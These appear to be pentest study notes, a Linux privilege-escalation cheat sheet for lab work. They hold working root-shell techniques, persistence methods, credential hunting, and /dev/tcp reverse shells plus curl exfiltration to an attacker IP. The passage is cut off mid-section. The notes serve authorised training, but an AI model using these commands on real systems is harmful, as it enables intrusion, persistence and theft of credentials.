# Linux Privilege Escalation

#Privesc #Linux #PrivilegeEscalation #SUID #Capabilities #Sudo #CronJobs #KernelExploits #ContainerEscape #SessionHijacking #tmux #screen #linPEAS #pspy #GTFOBins

## What is this?

Elevating from a low-privilege shell to root via misconfigurations, weak permissions, vulnerable services, SUID/SGID abuse, sudo misconfigs, capabilities, cron jobs, or kernel exploits. Goal: root shell or access to root-readable data. Pairs with [[Windows Priv Esc]], [[Password Attacks]], [[Shells & Payloads]].

Common staging dir: `/tmp` or `/dev/shm` (in-memory, no disk writes)

---

## Tools

| Tool | Use |
|------|-----|
| [[Tools/Scanning/linPEAS\|LinPEAS]] | Automated enumeration — finds most common vectors, color-coded output |
| [[Tools/Scanning/pspy\|pspy]] | Monitor processes without root — catch cron jobs, scripts run by root |
| [[Tools/Scanning/linux-exploit-suggester\|linux-exploit-suggester]] | Kernel/sudo/glibc version → CVE suggestions |
| [LinEnum](https://github.com/rebootuser/LinEnum) | Legacy but solid — broad automated enumeration |
| [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) | Python script, good for older systems |
| [GTFOBins](https://gtfobins.github.io/) | Reference for abusing sudo/SUID/capabilities on common binaries |
| [[Tools/Command Shell/tmux\|tmux]] | Hijack a target's detached session for privesc (below); also your own persistent/logged workspace |
| [[Tools/Command Shell/Vim\|Vim / vi]] | GTFO shell escape / sudo / SUID / capabilities — sudo-able editor = instant root |
| [[Tools/Command Shell/nano\|nano]] | GTFO `^R^X` Execute-Command shell; sudo/SUID file read-write to `/etc/passwd`/sudoers |

### Deliver tools to target

```bash
# Python HTTP server on attacker
python3 -m http.server 8080

# On target
wget http://10.10.14.x:8080/linpeas.sh -O /tmp/linpeas.sh
curl http://10.10.14.x:8080/linpeas.sh -o /tmp/linpeas.sh

chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/out.txt
```

> [!tip] **Need to pull loot *back* too? Use [[Tools/File Transfer/updog\|updog]] instead of `http.server`.** `python3 -m http.server` is download-only. [[Tools/File Transfer/updog\|updog]] serves *and* receives over one HTTP port, so the same server delivers your tools and catches exfil (hashes, `/etc/shadow`, dumps) with no receiver script.
> ```bash
> # Attacker — serve + receive on one port (default 9090)
> updog -d /tmp/loot -p 8001            # web-server convention: 8001+
>
> # Target — download a tool
> wget http://10.10.14.x:8001/linpeas.sh -O /tmp/linpeas.sh
> # Target — push loot back (multipart POST, no extra script)
> curl -X POST http://10.10.14.x:8001/ -F "file=@/etc/passwd"
> ```

---

## Stabilize First — Drop an SSH Key (no password needed)

A raw reverse shell is fragile: no real TTY, dies on a dropped connection, breaks `sudo`/`su`/`vi`. If the box runs SSH (port 22) and you have write access to a user's home, **append your public key to their `~/.ssh/authorized_keys`** — then log in over SSH for a stable, fully-interactive session with **no password**. Public-key auth ignores the account password entirely, so this works even on accounts whose password you don't know (or that have none). It doubles as persistence.

```bash
# 1. On ATTACKER — generate a throwaway keypair
ssh-keygen -t ed25519 -f ./id_key -N ''      # -N '' = no passphrase; creates id_key + id_key.pub
cat id_key.pub                                # copy this line
```

```bash
# 2. On TARGET (from your reverse shell) — drop the PUBLIC key into the victim user's authorized_keys.
#    Create ~/.ssh with correct perms or sshd will silently refuse the key.
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo 'ssh-ed25519 AAAA... attacker' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Targeting a specific user whose home you can write (e.g. after gaining their uid, or a world-writable home):
mkdir -p /home/victim/.ssh && chmod 700 /home/victim/.ssh
echo 'ssh-ed25519 AAAA... attacker' >> /home/victim/.ssh/authorized_keys
chmod 600 /home/victim/.ssh/authorized_keys
chown -R victim:victim /home/victim/.ssh     # ownership must match the user (if you're root/another uid)
```

```bash
# 3. On ATTACKER — log in with the PRIVATE key → stable shell, no password
chmod 600 id_key
ssh -i id_key victim@<target>
```

> [!warning] **Prerequisite: `sshd` must already be listening — key-drop does not start it.** Dropping a key is useless if nothing is on port 22.
> - **Port 22 missing from your scan ≠ SSH off.** It's very often **bound to `127.0.0.1`** or firewalled from the VPN (the shape of HTB *Era*). Confirm on-box first: `ss -tlnp | grep ':22'` or `ps aux | grep sshd`. If it's localhost-only, drop the key and reach it through a **port-forward / pivot** (`ssh -L`, chisel) or an on-box request — you don't need to "turn SSH on." **Full end-to-end chain (foothold → key → tunnel → shell):** [[Class notes/HTB Academy/CPTS v2 (claude)/Pivoting, Tunneling & Port Forwarding#Scenario — Turn a foothold into a stable SSH shell (localhost-bound sshd)|Pivoting → Stable SSH shell scenario]].
> - **Starting the real service needs root.** `systemctl start ssh` and binding **port 22** (privileged, <1024) both require root/sudo — an unprivileged user cannot enable the box's system SSH daemon.
> - **But a non-root user CAN run their *own* `sshd` on a high port** (no sudo), *if the `sshd` binary is present*. It runs as — and only lets in — the invoking user, which is exactly what you want; point every path at somewhere writable:
>   ```bash
>   ssh-keygen -t ed25519 -f /tmp/hk -N ''            # a host key you own
>   /usr/sbin/sshd -p 2222 -h /tmp/hk \
>     -o "PidFile /tmp/sshd.pid" -o "AuthorizedKeysFile /tmp/ak" -o "UsePAM no"
>   #  put your PUBLIC key in /tmp/ak, then:  ssh -i id_key -p 2222 victim@<target>
>   #  (tunnel 2222 out first if the host firewall blocks it)
>   ```
>   Doubles as persistence. If `sshd` isn't installed at all, skip this — keep the reverse shell plus another persistence method.

> [!warning] `sshd` **rejects keys if permissions are loose**: `~/.ssh` must be `700`, `authorized_keys` `600`, and both owned by that user. A key that "doesn't work" is almost always a perms/ownership problem (check `/var/log/auth.log`), or `PubkeyAuthentication no` / `AuthorizedKeysFile` overridden in `sshd_config`. Root's key goes in `/root/.ssh/authorized_keys`.

> [!warning] **Key works but the session closes instantly** — that's *not* an auth failure. `Last login: … / Never logged in` only prints **after** successful authentication, so if you see it and then get dropped, auth succeeded and a **broken login script** killed the shell. `/etc/profile`, `/etc/profile.d/*.sh`, and `~/.bash_profile`/`~/.profile` are sourced only for **login** shells; if one runs a command that fails (classic: a `lastlog`/`lastlog2` call on a box where it isn't installed) while `set -e`/`errexit` is active, the login shell exits and closes the connection. Sidestep it with a **non-login** shell:
> ```bash
> ssh -t -i id_key victim@<target> bash --noprofile --norc
> ```
> `-t` forces an interactive PTY; `--noprofile --norc` skips `/etc/profile` and the rc files entirely. Confirm the cause from your RCE shell: `grep <victim> /etc/passwd` (odd login shell?) and `grep -rn lastlog /etc/profile /etc/profile.d ~/.bash* 2>/dev/null`.

> [!tip] Related uses of the same primitive: if you can only **read** files (LFI/arbitrary read), grab an existing `~/.ssh/id_rsa`/`id_ed25519` private key and log in as-is. Dropping *your* key is the write-primitive version, and is also listed under [[#Post-Exploitation — Persistence]]. For upgrading a shell you can't SSH-replace, see [[Shells & Payloads]] (TTY upgrade).

---

## Initial Enumeration

### System Info

```bash
uname -a                        # Kernel version + arch
cat /etc/os-release             # Distro + version
cat /proc/version               # Kernel + compiler
hostname
lscpu                           # CPU info
```

### Users & Groups

```bash
id                              # Current user, groups, uid/gid
whoami
cat /etc/passwd                 # All users (look for non-system users with shells)
cat /etc/group                  # Groups + members
cat /etc/sudoers                # If readable — sudo config
sudo -l                         # What can current user run as sudo
last                            # Login history
w                               # Who is logged in
```

### Network

```bash
ip a                            # Interfaces + IPs
ip route                        # Routing table
ss -tulpn                       # Listening ports + processes
netstat -tulpn                  # Alternative
arp -a                          # ARP cache — adjacent hosts
cat /etc/hosts
```

### Processes & Services

```bash
ps aux                          # All processes
ps aux | grep root              # Root-owned processes
top -bn1                        # Snapshot of processes
systemctl list-units --type=service --state=running
```

### Installed Software

```bash
dpkg -l                         # Debian/Ubuntu
rpm -qa                         # RHEL/CentOS
apt list --installed 2>/dev/null
which python python3 perl ruby gcc wget curl nc ncat socat 2>/dev/null
```

### File Systems & Mounts

```bash
df -h
mount                           # Mounted filesystems
cat /etc/fstab                  # Check for NFS mounts, credentials in options
lsblk
```

### Environment

```bash
env
echo $PATH
cat ~/.bash_history
cat ~/.bashrc
cat ~/.bash_profile
```

---

## Sudo Exploitation

### Check sudo rights

```bash
sudo -l
```

**Output patterns and what they mean:**

```text
(ALL : ALL) ALL               → full sudo — su to root with: sudo su
(ALL) NOPASSWD: /usr/bin/vim  → run vim as root, no password
(root) /usr/bin/python3       → run python3 as root
```

### sudo ALL → root

```bash
sudo su
sudo bash
sudo -i
```

### NOPASSWD binary — check GTFOBins

Most common (dedicated deep-dives: [[Tools/Command Shell/Vim|Vim / vi]], [[Tools/Command Shell/nano|nano]]):

```bash
# vim — sudo-able editor = instant root
sudo vim -c ':!/bin/bash'

# nano — ^R^X Execute-Command shell, OR write a privileged file
sudo nano
# then: Ctrl-R, Ctrl-X, then:  reset; sh 1>&0 2>&0
sudo nano /etc/sudoers
# Add: <username> ALL=(ALL) NOPASSWD: ALL

# less / more
sudo less /etc/passwd
# Inside: !/bin/bash

# find
sudo find . -exec /bin/bash \; -quit

# python / python3
sudo python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# perl
sudo perl -e 'exec "/bin/bash";'

# ruby
sudo ruby -e 'exec "/bin/bash"'

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# nmap (older versions with --interactive)
sudo nmap --interactive
# Inside: !bash

# wget — overwrite /etc/sudoers or /etc/passwd
sudo wget http://10.10.14.x/sudoers -O /etc/sudoers

# tee — write to root-only files
echo "ALL ALL=(ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers

# tar — exec via checkpoint
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# zip
sudo zip /tmp/exploit.zip /tmp/exploit -T --unzip-command="sh -c /bin/bash"

# bash (if version allows -p to preserve SUID)
sudo bash -p
```

### sudo with specific environment — LD_PRELOAD

If `env_keep += LD_PRELOAD` is in sudoers:

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c
sudo LD_PRELOAD=/tmp/shell.so <allowed_command>
```

### sudo shell escape — restricted command with arguments

If sudo allows `(root) /usr/bin/vim /var/log/app.log`, try:
```bash
sudo vim /var/log/app.log -c ':!/bin/bash'
```

---

## SUID / SGID Binaries

### Find SUID/SGID

```bash
find / -perm -u=s -type f 2>/dev/null          # SUID
find / -perm -g=s -type f 2>/dev/null          # SGID
find / -perm /6000 -type f 2>/dev/null         # Both

# Compare against known-good list — anything unusual is worth checking
find / -perm -u=s -type f 2>/dev/null | xargs ls -la
```

### Common SUID exploits via GTFOBins

```bash
# bash (if SUID)
bash -p             # -p preserves EUID — opens root shell if SUID root

# cp — overwrite /etc/passwd or /etc/sudoers
cp /etc/passwd /tmp/passwd.bak
# edit /tmp/passwd.bak to add root user
cp /tmp/passwd.bak /etc/passwd

# find
find . -exec /bin/bash -p \; -quit

# vim / vi
vim -c ':py import os; os.execl("/bin/bash", "bash", "-p")'

# nmap
nmap --interactive   # !bash

# more / less
# Run as SUID, then: !bash

# python
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# env
env -i PATH=/tmp /bin/bash -p

# tee (SUID) — write to root-only files
echo "<root_user_entry>" | tee -a /etc/passwd
```

### Custom SUID binary with path injection

If a custom SUID binary calls a command without full path (e.g. `system("service apache2 start")`):

```bash
# Check for relative path calls (strings on the binary)
strings /path/to/suid_binary | grep -v "/"

# Inject via PATH
cd /tmp
echo '#!/bin/bash' > service
echo '/bin/bash -p' >> service
chmod +x service
export PATH=/tmp:$PATH
/path/to/suid_binary       # runs /tmp/service as root
```

---

## Linux Capabilities

Capabilities grant partial root-level abilities to binaries without full SUID. `cap_setuid+ep` is the key one — allows the binary to change its UID to 0.

### Find capabilities

```bash
getcap -r / 2>/dev/null
```

**Dangerous capabilities:**

| Capability | Risk |
|-----------|------|
| `cap_setuid+ep` | Set UID to 0 → root |
| `cap_setgid+ep` | Set GID to 0 |
| `cap_net_raw+ep` | Sniff traffic, raw sockets |
| `cap_sys_admin+ep` | Near-root — mount, namespace, etc. |
| `cap_dac_override+ep` | Bypass file permission checks |
| `cap_chown+ep` | Change ownership of any file |

### Exploiting cap_setuid

```bash
# Python with cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash")'

# perl with cap_setuid+ep
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# ruby with cap_setuid+ep
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# nodejs with cap_setuid+ep
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'

# vim with cap_setuid+ep
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'

# gdb with cap_setuid+ep
gdb -q --nx -ex 'python import os; os.setuid(0)' -ex '!bash' -ex quit
```

---

## Cron Jobs

Root cron jobs run scripts as root. If you can write to the script (or a script it calls), you get code execution as root.

### Enumerate cron

```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
crontab -l                          # Current user's crons
cat /var/spool/cron/crontabs/root   # Root's crontab (if readable)

# Watch for processes running as root (catch jobs not in crontab)
./pspy64
```

### Writable script called by root cron

```bash
# Check permissions on the script
ls -la /path/to/script.sh

# If writable, append a reverse shell
echo 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1' >> /path/to/script.sh

# Or replace entirely
cat > /path/to/script.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.x/4444 0>&1
EOF
```

> [!warning] **`/dev/tcp/host/port` is a bash-ism — `sh`/dash can't parse it, and cron uses `/bin/sh`.**
> `>& /dev/tcp/...` is parsed by *whatever shell reads the line* — and cron's default shell is `/bin/sh` (**dash** on Debian/Ubuntu). So `* * * * * bash -i >& /dev/tcp/...` fails **silently**: dash sees the `>&` first and tries to open `/dev/tcp/...` as a literal file, and in a cron context there's no terminal to show the error. Same trap for any `#!/bin/sh` script and any scheduler/`--command` field (custom sudo-able cron tools, `at`).
> **Fix — wrap it so bash parses its own redirection:**
> ```bash
> * * * * * root bash -c 'bash -i >& /dev/tcp/10.10.15.212/9002 0>&1'
> # custom scheduler tool: --command "bash -c 'bash -i >& /dev/tcp/10.10.15.212/9002 0>&1'"
> ```
> The outer dash just execs `bash -c '...'` (a simple command it has no trouble with); the inner bash does the `/dev/tcp` redirection natively. Alternatively put `SHELL=/bin/bash` at the top of the crontab.
> **When a cron shell "won't fire," sanity-check the boring things:** listener actually running (`nc -lvnp 9002`), your VPN IP still current (`ip a` on `tun0`), and the job's timing/permissions.

> [!tip] **Writable *binary* gated by a "signature check"?** Same primitive, one extra hoop: root runs the binary only if it passes a check. If that check is a **grep/existence test rather than a real crypto verify** (`objcopy…asn1parse…grep` with **no** `openssl *-verify` in the `pspy` trace), you graft the expected blob on and skip the key entirely. Full method + HTB Era worked example: [[Exploits/Signature Verification Bypass|Signature Verification Bypass]].

### Writable directory in cron PATH

If `PATH` in `/etc/crontab` includes a world-writable directory before the legitimate binary location:

```bash
# Check PATH order in /etc/crontab
# If /tmp or /home/user is in PATH before /usr/bin:
cat > /tmp/targetscript << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /tmp/targetscript
# Wait for cron to run → /tmp/rootbash -p gives root shell
```

### Wildcard injection in cron

If a root cron runs: `tar czf /backup/archive.tar.gz /home/user/*`

The wildcard `*` expands in the shell — filenames are treated as arguments:

```bash
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh shell.sh'
cat > shell.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x shell.sh
# Wait for cron → /tmp/rootbash -p
```

Works with: `tar`, `rsync`, `chown`, `chmod`

### Privileged process, attacker-controlled input

Subtler than a writable script: a root cron/script whose **input** — a file or a field inside it — lives somewhere the unprivileged user controls, and the script **re-parses** that input. You don't overwrite the script; you feed it a payload.

```bash
# pspy reveals a root job reading a dir the user owns:
#   UID=0 | timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt
# /opt/renew_cert.sh is world-readable; its last line:
#   /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
```

`$commonName` is parsed out of *the certificate you supply* and then `bash -c`-re-parsed → command injection as root. The sink shape and the delivery are covered in [[Command Injection]] → *Re-parsed shell string* and [[Tools/Web/openssl|openssl]] → *Abusing a cert-renewal script*. Two things specific to reaching it here:

- **Gate:** the script skips work on a healthy cert (`openssl x509 -checkend 86400` returns 0 → "no need to renew" → exit). Hand it a cert generated with `-days 1` so `checkend` returns non-zero and execution continues. An empty/unparseable file also passes — `openssl` errors, indistinguishable from "expiring" to a bare `$?`.
- **Race:** the job often wipes its input dir each cycle (`rm -r /home/bill/Certs/*`), so drop the payload cert in *just before* the next run; watch the file disappear to learn the interval.

> [!warning] **SUID-shell creation gotchas** — apply to *any* `cp /bin/bash …; chmod +s` payload (the wildcard-cron one above included). Each failure looks like success:
> 1. **`rm -f /tmp/rootbash` first.** `cp` onto an *existing* file reuses that inode and preserves its owner — root's copy inherits **your** ownership, `chmod +s` sets setuid on a file *you* own, and you get a setuid-*yourself* shell that reads perfectly in `ls -la`.
> 2. **`chmod u+s` / `+s` / `4755`, not `g+s`** — `g+s` sets egid 0 only, euid unchanged.
> 3. **Run it `bash -p`.** Bash drops its effective uid on startup unless invoked with `-p`; without it you get a shell that "worked" and is still you.
> 4. **`timeout N` around a cron invocation** makes a reverse shell a live N-second window you must catch. A dropped SUID binary or an SSH key persists — prefer those.
>
> Verify the **mechanism, not the symptom**: `ls -la` for `root root` ownership *and* the `s` bit, then `id` after `/tmp/rootbash -p`.

---

## Writable Files & Paths

### /etc/passwd

If writable, add a root-equivalent user (no shadow password needed — put hash directly in passwd):

```bash
# Generate a password hash
openssl passwd -1 -salt hax p4ssword
# or (the `crypt` module was removed in Python 3.13 — use openssl or mkpasswd there)
python3 -c "import crypt; print(crypt.crypt('p4ssword', '\$1\$hax\$'))"
mkpasswd -m sha-512 p4ssword          # if whois/mkpasswd is installed

# Append new root user
echo 'haxroot:$1$hax$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd

# Or set empty password (if passwd allows it)
echo 'haxroot::0:0:root:/root:/bin/bash' >> /etc/passwd

su haxroot
```

### /etc/shadow

If readable, copy hashes for cracking:

```bash
cat /etc/shadow
# Copy root hash:
hashcat -m 1800 '$6$...' /usr/share/wordlists/rockyou.txt   # sha512crypt
hashcat -m 500  '$1$...' /usr/share/wordlists/rockyou.txt   # md5crypt
```

### /etc/sudoers

If writable:

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo bash
```

### Writable script called by root (general)

```bash
# Find files owned by root that are world-writable
find / -user root -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | grep -v "^/dev"

# Or group-writable files where you're in the group
find / -group $(id -g) -writable -not -path "/proc/*" 2>/dev/null
```

---

## NFS (No Root Squash)

By default NFS squashes the root user — root on the client maps to `nobody` on the server. If `no_root_squash` is set, root on the client IS root on the NFS share.

### Check for no_root_squash

```bash
# On target (if you can read /etc/exports)
cat /etc/exports
# Look for: /share *(rw,no_root_squash)

# From attacker — check showmount
showmount -e <target_ip>
```

### Exploit no_root_squash

On attacker (as root):

```bash
# Mount the export
mkdir /mnt/target_nfs
mount -t nfs <target_ip>:/share /mnt/target_nfs

# Create SUID bash
cp /bin/bash /mnt/target_nfs/rootbash
chmod +s /mnt/target_nfs/rootbash

# On target — execute
/share/rootbash -p          # root shell
```

---

## PATH Hijacking

A script or binary runs a command without full path (e.g. `service`, `python`, `gcc`) — inject your own version via PATH.

```bash
# Find writable directories in PATH
echo $PATH
ls -la /usr/local/bin /usr/local/sbin

# Create malicious binary
mkdir /tmp/hijack
cat > /tmp/hijack/service << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/hijack/service

# Prepend to PATH
export PATH=/tmp/hijack:$PATH

# Run the vulnerable binary
/path/to/vulnerable_suid_binary
```

---

## Shared Library Hijacking

### LD_PRELOAD (if set in environment and allowed)

```c
// preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
LD_PRELOAD=/tmp/preload.so <suid_or_sudo_binary>
```

### LD_LIBRARY_PATH (if binary uses relative library path)

```bash
# Find library calls
ldd /path/to/binary
# If any library is in a writable directory, create a malicious version

# Or if binary loads from current directory
readelf -d /path/to/binary | grep -i rpath
```

### LD_AUDIT (LD_PRELOAD Alternative)

`LD_AUDIT` loads a shared library to audit dynamic linker events. Many `sudoers` configs strip `LD_PRELOAD` but forget `LD_AUDIT`. Same code, different variable.

```c
// audit.c — same technique as LD_PRELOAD but uses la_version() entry point
#include <stdio.h>
#include <stdlib.h>
unsigned int la_version(unsigned int v) {
    unsetenv("LD_AUDIT");
    setuid(0); setgid(0);
    system("/bin/bash");
    return v;
}
```

```bash
gcc -fPIC -shared -o /tmp/audit.so audit.c
sudo LD_AUDIT=/tmp/audit.so <allowed_sudo_command>
```

> [!tip] If sudoers has `env_keep += LD_PRELOAD` missing but `env_reset` isn't stripping all vars, try `LD_AUDIT`. Also worth trying if `LD_PRELOAD` is explicitly listed in `env_delete`.

### Writable /etc/ld.so.conf.d/

```bash
ls -la /etc/ld.so.conf.d/
# If writable, add a path where you control a library:
echo "/tmp/libs" >> /etc/ld.so.conf.d/evil.conf
ldconfig
# Place malicious .so in /tmp/libs/ with same name as a library the SUID binary uses
```

---

## systemd Service Abuse

If you can write to a `.service` file or drop a new one into a writable systemd directory, replace `ExecStart` with a shell command. Reload and restart the service as root.

```bash
# Find writable service files
find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system \
  -name "*.service" -writable 2>/dev/null

# Check if any service timer runs periodically as root
systemctl list-timers --all

# If you can write to a service file — replace ExecStart
cat /etc/systemd/system/vulnerable.service
# Edit ExecStart line:
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1'

# Or create a new service if /etc/systemd/system is writable:
cat > /etc/systemd/system/evil.service << 'EOF'
[Unit]
Description=Evil

[Service]
Type=simple
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'

[Install]
WantedBy=multi-user.target
EOF

# Reload and start (if you can run systemctl as sudo or service is auto-started)
sudo systemctl daemon-reload
sudo systemctl start evil.service
# Or wait for a timer/reboot if the service is enabled
```

---

## udev Rule Injection

`udev` runs rules as root when hardware events occur. If `/etc/udev/rules.d/` is writable, inject a rule that executes a command.

```bash
# Check if rules directory is writable
ls -la /etc/udev/rules.d/

# Create a rule that runs on any USB/device event:
cat > /etc/udev/rules.d/99-evil.rules << 'EOF'
SUBSYSTEM=="net", RUN+="/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'"
EOF

# Trigger the rule — udev fires on device events
# Method 1: trigger manually (may require sudo)
udevadm trigger

# Method 2: wait for a hardware event (network interface up/down, USB plug)
# Method 3: use ip link to bounce a network interface (if allowed):
ip link set eth0 down && ip link set eth0 up

# After rule fires:
/tmp/rootbash -p
```

> [!note] udev rules fire as root on device events. The `RUN+=` directive executes the command immediately when the matching event occurs. Works even without a persistent connection as long as a device event triggers.

---

## Docker / LXC Escape

### Check if in a container

```bash
cat /proc/1/cgroup | grep docker
ls /.dockerenv                  # Exists inside Docker containers
env | grep -i kube
```

### Docker group

Being in the `docker` group is equivalent to root:

```bash
id | grep docker
groups | grep docker

# Mount host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Or start a privileged container
docker run --rm -it --privileged --net=host alpine sh
# Inside: mount /dev/sda1 /mnt → access host FS
```

### LXC / LXD group

```bash
id | grep lxd

# On attacker — build a minimal Alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder && sudo bash build-alpine
# Transfer alpine.tar.gz to target

# On target
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
# Inside: cd /mnt/root → full host FS access as root
```

### Privileged container breakout

If already inside a privileged container:

```bash
fdisk -l                        # List host disks
mkdir /mnt/host
mount /dev/sda1 /mnt/host       # Mount host FS
chroot /mnt/host                # Root on host
```

---

## Credential Hunting

### History files

```bash
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.psql_history
find / -name ".*_history" -readable 2>/dev/null
```

### Config files

```bash
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "*.config" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "*.env" -readable 2>/dev/null | xargs grep -l "password\|secret\|key" 2>/dev/null

# Common locations
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat /etc/mysql/mysql.conf.d/mysqld.cnf
find /var/www -name "*.php" | xargs grep -i "password\|passwd\|db_pass" 2>/dev/null
```

### Logs

```bash
# Logs sometimes contain credentials passed as CLI args or in error output
grep -rn "password\|passwd\|token\|secret" /var/log/ 2>/dev/null
ls -la /var/log/
cat /var/log/auth.log       # SSH logins, sudo usage
cat /var/log/syslog
```

### SSH keys / GPG

```bash
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find / -name "*.pem" -o -name "*.ppk" 2>/dev/null
cat ~/.ssh/id_rsa
ls -la ~/.ssh/
ls -la ~/.gnupg/            # GPG keys — may unlock encrypted files or password managers
```

### Password in scripts / env

```bash
grep -rn "password\|passwd\|secret\|api_key\|token" /home /var/www /opt /etc 2>/dev/null
grep -rn "PASS\|PASSWORD" /etc/environment /etc/profile.d/ 2>/dev/null
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass
printenv                    # Current environment variables
```

> [!tip] No shell yet? You can harvest these same env-var secrets with just an **LFI / arbitrary file-read** — read `/proc/self/environ` (the web process) and `/proc/<pid>/environ` (other processes, if readable) for DB creds, API keys, `SECRET_KEY`, and the deploy path. Full technique: [[File Inclusion]] → *`/proc/self/environ`*.

### Writable .bashrc / .bash_profile

```bash
# Check if writable for another user's home
ls -la /home/otheruser/.bashrc
# If so, add reverse shell — fires when that user logs in
echo 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1' >> /home/otheruser/.bashrc
```

---

## Kernel Exploits

Last resort — can crash the system, use carefully.

### Check kernel version

```bash
uname -r
uname -a
cat /etc/os-release
```

### Get suggestions

```bash
# linux-exploit-suggester
wget https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# searchsploit on Kali
searchsploit linux kernel <version>
searchsploit linux privilege escalation
```

### Notable kernel exploits

| CVE | Name | Affected versions |
|-----|------|----------------|
| CVE-2025-32463 | sudo `--chroot` NSS load | sudo 1.9.14 – 1.9.17 (fixed 1.9.17p1) |
| CVE-2025-32462 | sudo `-h` host option | sudo < 1.9.17p1 |
| CVE-2024-1086 | nf_tables use-after-free | kernel 5.14 – 6.6 (root cause back to 3.15) |
| CVE-2023-4911 | Looney Tunables (glibc `ld.so`) | glibc 2.34 – 2.38 |
| CVE-2022-0847 | Dirty Pipe | kernel 5.8 – 5.16.11 |
| CVE-2021-4034 | PwnKit (pkexec) | All with Polkit |
| CVE-2021-3156 | Baron Samedit (sudo) | sudo < 1.9.5p2 |
| CVE-2019-14287 | sudo -1 bypass | sudo < 1.8.28 |
| CVE-2019-18634 | sudo pwfeedback | sudo < 1.8.31 |
| CVE-2016-5195 | Dirty COW | kernel 2.6.22 – 4.8.3 |

```bash
# Version checks that decide which of the above are even candidates
uname -r                        # kernel
sudo --version | head -1        # sudo
ldd --version | head -1         # glibc
```

> [!warning] **A headline version is not a patch level — distros backport.** `uname -r` of `5.10.0-20-amd64` reads as "kernel 5.10", but Debian/RHEL **pin major.minor for a release's lifetime and backport security fixes into the third component + `-N` build**. Dirty Pipe was fixed upstream in **5.10.102**; Debian's `5.10.158-2` is patched despite looking like "5.10", and a distro 5.10 can be *better* patched than a mainline 6.x. So: compare the **third number against the upstream fix** *and* the **package version against the distro tracker** (`apt-cache policy linux-image-*`, Debian DSA / RHSA), never the mainline CVE range alone. `searchsploit`-matching on "5.10" yields piles of long-patched CVEs — treat those as candidates to *disprove*, not findings. Same logic for sudo/glibc: a "no sudoers entry" account is still a candidate for Baron Samedit / PwnKit (reachable by any local user), so check the version regardless.

```bash
# --- sudo chroot (CVE-2025-32463) — CISA KEV, works on DEFAULT builds ---
# sudo -R honours config inside a user-controlled chroot, so it loads an
# attacker-supplied NSS module as root. No sudoers entry needed.
git clone https://github.com/kh4sh3i/CVE-2025-32463
# Check first — this is the highest-value modern candidate:
sudo --version | head -1        # 1.9.14 through 1.9.17 → vulnerable

# --- nf_tables (CVE-2024-1086) — also CISA KEV, seen in ransomware ---
# Needs unprivileged user namespaces enabled:
cat /proc/sys/kernel/unprivileged_userns_clone   # 1 = exploitable path open
sysctl kernel.unprivileged_userns_clone
# PoC: https://github.com/Notselwyn/CVE-2024-1086

# --- Looney Tunables (CVE-2023-4911) ---
